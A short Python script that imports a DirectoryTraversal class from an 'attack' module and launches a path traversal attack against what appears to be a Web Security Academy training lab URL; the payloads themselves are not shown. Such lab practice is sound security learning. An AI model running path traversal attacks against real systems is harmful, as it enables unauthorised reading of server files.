from attack.path_traverse import DirectoryTraversal
target_url = "https://0a9200c00386067f816fb78900130066.web-security-academy.net/"
pt = DirectoryTraversal(target_url)
pt.path_traversal()
